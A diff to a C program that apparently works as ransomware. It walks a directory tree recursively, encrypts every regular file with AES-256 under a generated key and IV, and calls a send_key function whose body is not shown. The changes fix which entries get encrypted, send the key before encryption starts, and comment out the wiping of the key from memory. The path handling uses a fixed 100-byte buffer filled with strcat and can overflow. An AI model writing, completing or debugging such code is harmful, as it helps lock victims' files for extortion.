@@ -45,32 +45,39 @@ int is_encrypted(char *filename)
 void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
 {
 	DIR* dir = opendir(name);
+	
 	if (dir == NULL)
 	{
-		return;
+		handleErrors();
 	}
+	
 	struct dirent* entity;
 	entity = readdir(dir);
+	
 	while (entity != NULL)
 	{
 		 if (entity->d_name[0] != '.')
-		 {
-			printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);
-		 }
+		{
+			printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);			
+		}		
+
 		if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
 		{
-			// if(strcmp(d_name, ".")!=0)			
 			char path[100] = {0};
 			strcat(path,name);
 			strcat(path,"/");
 			strcat(path,entity->d_name);
-			listdir(path, iv, key, 'e');
-			
-			if(de_flag=='e');
-			{
-				encrypt(key, iv, entity->d_name);
-			}
+			listdir(path, iv, key, 'e');			
 		}
+		
+		else if(entity->d_type == DT_REG && de_flag=='e')
+		{		
+			printf("%s\n",entity->d_name);
+			// printf("%x\n",key);
+			
+			encrypt(key, iv, entity->d_name);
+		}	
+		
 		entity = readdir(dir);
 	}
 	closedir(dir);
@@ -88,8 +95,8 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 	bytes_to_hexa(key , pKey, sizeKey);
 	bytes_to_hexa(iv , pIv, sizeIv);
 	
-	OPENSSL_cleanse(key,sizeof(key));	
-	OPENSSL_cleanse(iv,sizeof(iv));
+	// OPENSSL_cleanse(key,sizeof(key));	
+	// OPENSSL_cleanse(iv,sizeof(iv));
 }
 
 int send_key(char *pKey, char *pIv)
@@ -135,21 +142,22 @@ int main (int argc, char * argv[])
 	
 	else if(argc==3)
 	{
+		unsigned char key[AES_256_KEY_SIZE];
+		unsigned char iv[AES_BLOCK_SIZE];
+
+		int sizeKey = AES_256_KEY_SIZE; 
+		int sizeIv = AES_BLOCK_SIZE;
+		
+		char * pKey = (char *) malloc(sizeof(key)*2+1);
+		char * pIv = (char *) malloc(sizeof(iv)*2+1);
+		
 		if(strcmp(argv[2], "-enc")==0) 
 		{
 			printf("The directory is %s\n", argv[1]);
-			unsigned char key[AES_256_KEY_SIZE];
-			unsigned char iv[AES_BLOCK_SIZE];
-
-			int sizeKey = AES_256_KEY_SIZE; 
-			int sizeIv = AES_BLOCK_SIZE;
-			
-			char * pKey = (char *) malloc(sizeof(key)*2+1);
-			char * pIv = (char *) malloc(sizeof(iv)*2+1);
 			
 			generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
-			listdir(argv[1], iv, key, 'e');
 			send_key(pKey, pIv);
+			listdir(argv[1], iv, key, 'e');
 		}
 		
 		else if (strcmp(argv[2], "-dec")==0)
